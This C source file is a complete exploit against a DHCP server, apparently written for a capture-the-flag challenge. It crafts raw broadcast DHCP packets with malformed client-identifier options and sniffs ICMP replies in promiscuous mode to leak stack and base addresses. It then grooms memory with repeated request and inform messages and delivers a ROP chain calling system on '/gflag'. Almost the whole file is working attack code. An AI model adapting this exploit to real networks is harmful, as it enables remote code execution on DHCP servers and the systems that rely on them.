#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>   
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
 
#include <stdbool.h>
#include <netdb.h>  
#include <net/if.h> 
#include <sys/ioctl.h>  
#include <bits/ioctls.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>     
#include <linux/if_packet.h> 
 
long long pop_rdi;
long long system_ptr;
long long ret_addr;
struct udpheader
{
	unsigned short uh_sport;        /* source port */
    unsigned short uh_dport;        /* destination port */
    unsigned short uh_ulen;        /* udp length */
    unsigned short uh_sum;        /* udp checksum */
  //  char  fill[60000];
};

struct unudpheader
{
	unsigned int saddr;        /* source port */
    unsigned int daddr;        /* destination port */
    unsigned char flag;        /* udp length */
	unsigned char pl; 
    unsigned short len;        /* udp checksum */
    char  fill[60000];
};

unsigned short ip_checksum(unsigned short* buffer, int size);
int get_udpcheck(unsigned int    saddr,unsigned int    daddr,int len,char* buf,struct unudpheader **tmp);
struct udpheader *fill_udp_header(unsigned int    saddr,unsigned int    daddr,unsigned short src_port, unsigned short dst_port, int udp_packet_len);
int raw_send(char *buf,int size);
struct ip *fill_ip_header(unsigned int    saddr,unsigned int    daddr);
int udp_send(unsigned int saddr,unsigned int daddr,unsigned short src_port,unsigned short dst_port,char *p,int len );
int set_promisc (char *if_name, int sockfd);
int dhcp_request(char** buf,int len,char* payload,int payload_len,char* addr);


//--------------------------------------------------------
 
 

struct ip *fill_ip_header(unsigned int    saddr,unsigned int    daddr)
{
    struct ip *ip_header;
    ip_header = (struct ip *)malloc(20);
    ip_header->ip_v = IPVERSION;
    ip_header->ip_hl = 0x5;       
    ip_header->ip_tos = 16;
    ip_header->ip_len = htons(20+16+20+12);       
    ip_header->ip_id = 8725;                       
    ip_header->ip_off = 0;
    ip_header->ip_ttl = MAXTTL;
    ip_header->ip_p = IPPROTO_GRE	;  
    ip_header->ip_sum = 0;                            
    ip_header->ip_src.s_addr =saddr;       
    ip_header->ip_dst.s_addr =daddr;    
    return ip_header;
} 




int raw_send(char *buf,int size)
{
	    int i, datalen,frame_length, sd, bytes;
    char *interface="ens33";;//"eth1"
    uint8_t src_mac[6];
    uint8_t dst_mac[6]="\xff\xff\xff\xff\xff\xff";
    uint8_t ether_frame[IP_MAXPACKET];
    struct sockaddr_ll device;
    struct ifreq ifr;
    if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
        perror ("socket() failed to get socket descriptor for using ioctl() ");
        exit (EXIT_FAILURE);
    }
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
    if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
        perror ("ioctl() failed to get source MAC address ");
        return (EXIT_FAILURE);
    }
    close (sd);
    memcpy (src_mac, ifr.ifr_hwaddr.sa_data, 6);
    memset (&device, 0, sizeof (device));
    if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
        perror ("if_nametoindex() failed to obtain interface index ");
        exit (EXIT_FAILURE);
    }
    device.sll_family = AF_PACKET;
    memcpy (device.sll_addr, src_mac, 6);
    frame_length = 6 + 6 + 2   + size;
    memcpy (ether_frame, dst_mac, 6);
    memcpy (ether_frame + 6, src_mac, 6);
    ether_frame[12] = 0x08;
    ether_frame[13] = 0;
    memcpy (ether_frame + 14 , buf, size);
    if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
        perror ("socket() failed ");
        exit (EXIT_FAILURE);
    }
    if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
        perror ("sendto() failed");
        exit (EXIT_FAILURE);
    }
    close (sd);
    return frame_length;
}
struct udpheader *fill_udp_header(unsigned int    saddr,unsigned int    daddr,unsigned short src_port, unsigned short dst_port, int udp_packet_len)
 {
     struct udpheader *udp_header;
     struct unudpheader* p=NULL;
     udp_header = (struct udpheader *)malloc(8);
     udp_header->uh_sport = src_port; 
      udp_header->uh_dport = dst_port;
      udp_header->uh_ulen = htons(udp_packet_len);
      udp_header->uh_sum = 0;
      return udp_header;
  }
 int get_udpcheck(unsigned int    saddr,unsigned int    daddr,int len,char* buf,struct unudpheader **tmp)
{
	int ret;
	int i=0,chksumlen=0,check;
	struct unudpheader *uuheader;
	uuheader=(struct unudpheader *)malloc(sizeof(struct unudpheader));
	memset((char*)uuheader,0x00,sizeof(struct unudpheader));
	uuheader->saddr=saddr;
	uuheader->daddr=daddr;
	uuheader->flag=0;
	uuheader->pl=17;
	uuheader->len=htons(len);
	memcpy((char*)uuheader+12,buf,len);
	*tmp=uuheader;
	check=ip_checksum((unsigned short int *) uuheader,(len+12));
	free(uuheader);
	return check;
}
 unsigned short ip_checksum(unsigned short* buffer, int size)
 {
	 unsigned long cksum = 0;
	 while (size > 1)
	 {
		 cksum += *buffer++;
		 size -= sizeof(unsigned short);
	 }
	 if (size)
	 {
		 cksum += *(unsigned char*)buffer;
	 }
	 cksum = (cksum >> 16) + (cksum & 0xffff);
	 cksum += (cksum >> 16);
	 return (unsigned short)(~cksum);
 }
int dhcp_request(char** buf,int len,char* payload,int payload_len,char* addr)
{
	char *Bootstrap=(char*)malloc(0x1000);
	char *p=Bootstrap;
	*buf=Bootstrap;
	*p=1;//bootstrap_header.message_type
	p++;
	*p=1;//bootstrap_header.hardware_type
	p++;
	*p=6;//bootstrap_header.hardware_len
	p++;
	*p=0;//bootstrap_header.hops
	p++;
	*(int*)p=0x3d981a96;//bootstrap_header.transaction
	p=p+4;
	*(unsigned short*)p=0;//bootstrap_header.seconds_elapsed
	p=p+2;

	*(unsigned short*)p=0;//bootp_flags.bootp_flags
	p=p+2;

	*(int*)p=inet_addr("172.16.253.128");//12
	p=p+4;
	*(int *)p=0;//bootp_flags.local_ip
	p=p+4;
	*(int *)p=0;//bootp_flags.next_server_ip
	p=p+4;
	*(int *)p=0;//bootp_flags.relay_agent_ip
	p=p+4;
	memcpy(p,"\x00\x0c\x29\x88\xa7\x9a",6);//bootp_flags.client_mac_address
	p=p+6;
	memset(p,0,10);//bootp_flags.client_hardware_address_padding
	p=p+10;
	memset(p,0x41,0x40);//bootp_flags.server_host_name_not_given 44
	p=p+0x40;
	memset(p,0x42,0x80);//bootp_flags.boot_file_name_not_given
	p=p+0x80;
	*(int *)p=0x63538263;//bootp_flags.magic_cookie
	p=p+4;
	
	//message_type
	*p=0x35;
	p++;
	*p=1;
	p++;
	*p=1;
	p++;
	
	//requested_ip
	*p=0x32;
	p++;
	*p=4;
	p++;
	*(int*)p=inet_addr("172.16.253.128");
	p=p+4;
	//memory for large uid
	*p=0x3d;
	p++;
	*p=0x28;
	p++;
	memset(p,0x61,0x28);
	p=p+0x28;
 
	
	//parameter_request_list
	*p=0x37;
	p++;
	*p=23;
	p++;
	memcpy(p,"\x01\x1c\x02\x79\x0f\x06\x0c\x28\x29\x2a\x1a\x77\x03\x79\xf9\x21\x2a\x01\x81\xfe\xff\x00\x03",23);
	p=p+23;
	
	//router
	*p=3;
	p++;
	*p=5;
	p++;
	memcpy(p,"\xc0\xa8\xe4\x02",4);
	p=p+5;

	//domain_name
	*p=15;
	p++;
	*p=16;
	p++;
	memcpy(p,"\x6c\x6f\x63\x61\x6c\x64\x6f\x6d\x61\x69\x6e",11);
	p=p+16;
	
	//broadcast_address
	*p=28;
	p++;
	*p=4;
	p++;
	memcpy(p,"\xc0\xa8\xe4\xff",4);
	p=p+4;
	
	//subnet_mask
	*p=0x33;
	p++;
	*p=4;
	p++;
	memcpy(p,"\x00\x00\x07\x08",4);
	p=p+4;
	
	//dhcp_server_identifier
	*p=0x36;
	p++;
	*p=4;
	p++;
	memcpy(p,"\xc0\xa8\xe4\xfe",4);
	p=p+4;
	
	*p=0xff;
	p++;
	
	memset(p,0,31);
	p=p+31;
	
	len=p-Bootstrap;

	
	return len;
	 
	//return 0;

}
 

int udp_send(unsigned int saddr,unsigned int daddr,unsigned short src_port,unsigned short dst_port,char* p,int len  )
{
	
	struct ip *ip_header;
	int ret;
	
	unsigned short checksum;
	struct udpheader *udp_header;
	char *buf;
	buf=(char*)malloc(4096+4);
	udp_header=fill_udp_header(saddr, daddr, src_port,dst_port,1000);
	ip_header=fill_ip_header(saddr,daddr);
	ip_header->ip_p=17;
	ip_header->ip_src.s_addr =0;      
	ip_header->ip_dst.s_addr =0xffffffff;
	ip_header->ip_len=htons(20+8+len);
	ip_header->ip_sum = ip_checksum((unsigned short*)ip_header,20);
    memcpy(buf,(char*)ip_header,20);
	free((char*)ip_header);
	udp_header->uh_ulen = htons(len+8);
	memcpy(buf+20,(char*)udp_header,8);
	memcpy(buf+28,p,len);
	free(p);
	udp_header->uh_sum=get_udpcheck(0,0xffffffff,len+8,buf+20,(struct unudpheader **)&p);
	memcpy(buf+20,(char*)udp_header,8);
	free((char*)udp_header);
	ret=raw_send(buf, 28+len);
	free(buf);
	return ret;
}

 

void *get_stack_base_send(void *arg)
{
	unsigned int    saddr=inet_addr("0.0.0.0");
	unsigned int    daddr=inet_addr("255.255.255.255");
	unsigned short dst_port=htons(67); 
	unsigned short src_port=htons(68);
	int i=0,len=0,n=3,size=0x10,uid_len=0x10;
	char *p;
	char buf[0x1024]={0};
	sleep(1);
		len=dhcp_request(&p,0,0,0,0);
		*(char*)(p+0xf8)=*(char*)(p+0xf8)-3;//换 request_ip  0xa0
	    *(char*)(p+15)=*(char*)(p+15)-3;// //bootp_flags.client_ip
		memcpy(buf,p,248+2);
		buf[248+2]=size;
		memset(buf+248+3,0x61,size);
		memcpy(buf+248+3+size,p+248+3+uid_len,64+16);
		len=len-uid_len+size;
		free(p);
		p=(char*)malloc(0x1000);
		memcpy(p,buf,0x1000);
		udp_send(saddr,daddr,src_port,dst_port,p,len );	
		n--;
		sleep(1);
	printf("get_stack_base_send  end stop \n");
   return NULL;
}

int set_promisc (char *if_name, int sockfd)
{
    struct ifreq ifr;

    strcpy (ifr.ifr_name, if_name);
    if (0 != ioctl (sockfd, SIOCGIFFLAGS, &ifr))
    {
        printf ("Get interface flag failed\n");
        return -1;
    }
    ifr.ifr_flags |= IFF_PROMISC;

    if (0 != ioctl (sockfd, SIOCSIFFLAGS, &ifr))
    {
        printf ("Set interface flag failed\n");
        return -1;
    }
}
long long base_addr = 0, stack_addr = 0;
void  *get_stack_base_recv()
{
	 int sockfd;
    int ret = 0;
    char buffer[1518] = {0};
	char *p;
    unsigned char *eth_head = NULL;
    struct iphdr *iph = NULL;
	void* icmpH;
	long long i=0;
   if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0)
   {
       printf ("create socket failed\n");
       return ;
   }

   if (0 != set_promisc ("ens33", sockfd))
   {
       printf ("Failed to set interface promisc mode\n");
	   return;
   }
  
   while (i<0x40)
   {
        memset (buffer, 0x0, sizeof (buffer));
        ret = recvfrom (sockfd, buffer, sizeof (buffer), 0, NULL, NULL);
 
        iph = (struct iphdr*)((char*)buffer + 6 + 6 + 2);
		icmpH=(void*)((char*)iph +sizeof(*iph));
		p=((char* )icmpH+8);
   
		if(iph->protocol!=1)
		{
			continue;
		}
		if(iph->saddr!=inet_addr("172.16.253.254"))
		{
			continue;
		}		
        memcpy(&stack_addr,p+8,8);
		memcpy(&base_addr,p+16,8);
		base_addr -= 0x1c168;
		i++;
		if (stack_addr < 0x7f00000000) { continue; }
		printf("stack_addr %llx\n",stack_addr);
		printf("base_addr %llx\n",base_addr);
		if(stack_addr!=0&&base_addr!=0)
		{
			return;
		}
   }
   return NULL;
}
void request_inform(char *ptr, int size) {
	unsigned int    saddr = inet_addr("0.0.0.0");
	unsigned int    daddr = inet_addr("255.255.255.255");
	unsigned short dst_port = htons(67);
	unsigned short src_port = htons(68);
	char buf[4096] = { 0 };
	int i = 0, len = 0, a, ret = 0, uid_len = 0x28, zero_addr = 0;
	char *p;
	len = dhcp_request(&p, 0, 0, 0, 0);
	*(char*)(p + 242) = 8;//message_type
		memcpy(buf, p, 248 + 2);
		buf[248 + 2] = size;
		memcpy(buf + 248 + 3, ptr, size);
		memcpy(buf + 248 + 3 + size, p + 248 + 3 + uid_len, 64 + 16);
		len = len - uid_len + size;
	len = len - uid_len + size;
	free(p);
	p = (char*)malloc(0x1000);
	memcpy(p, buf, 0x1000);
	ret = udp_send(saddr, daddr, src_port, dst_port, p, len);
}


int exploit(){

	unsigned int    saddr=inet_addr("0.0.0.0");
	unsigned int    daddr=inet_addr("255.255.255.255");
	unsigned short dst_port=htons(67); 
	unsigned short src_port=htons(68);
	int i=0,len=0,a,ret=0,uid_len=0x28,size=0x10;
	char *p;
	char buf[2048]={0};
	i=0;
	while(i<0x3)
	{

	     len=dhcp_request(&p,0,0,0,0);
	     *(char*)(p+242)=3;
		 *(char*)(p+0xf8)=200+i;//request_ip  0xa0
	     *(char*)(p+15)=200+i;// //bootp_flags.client_ip
		 *(char*)(p+248+5)=i;
  
	     ret=udp_send(saddr,daddr,src_port,dst_port,p,len );	
	     usleep(900);
		 i++;
	}
	char *z = "123";
	for (int i = 0; i < 40; i++)
		request_inform(z, 0x28);
	i = 0;
	sleep(1);
	while(i<0x3)
	{
	    len=dhcp_request(&p,0,0,0,0);
	    *(char*)(p+242)=7;
		*(char*)(p+0xf8)=200+i;//换 request_ip  0xa0
	    *(char*)(p+15)=200+i;// //bootp_flags.client_ip
	    ret=udp_send(saddr,daddr,src_port,dst_port,p,len );		
	    usleep(900);
        i++;	
	}
	sleep(1);
	i = 0;
	while (i < 0x3)
	{
		len = dhcp_request(&p, 0, 0, 0, 0);

		*(char*)(p + 242) = 3;
		*(char*)(p + 0xf8) = 200+i;//换 request_ip  0xa0
		*(char*)(p + 15) = 200+i;// //bootp_flags.client_ip
		*(long long*)(p + 248 +3) = stack_addr-0x20;
		ret = udp_send(saddr, daddr, src_port, dst_port, p, len);
		usleep(900);
		i++;
	}
	sleep(1);
	ret_addr= base_addr + 0x000000000002131d;
	pop_rdi = base_addr + 0x0000000000019d21;
	system_ptr = base_addr + 0x00000000000191b8;
	long long rop[5];
	rop[0] = pop_rdi;
	rop[1] = stack_addr;
	rop[2] = ret_addr;
	rop[3] = system_ptr;
	memcpy(&rop[4], "/gflag\x0", 8);
	for (int i = 0; i < 40; i++)
		request_inform(rop, 0x28);
    return ret;
}
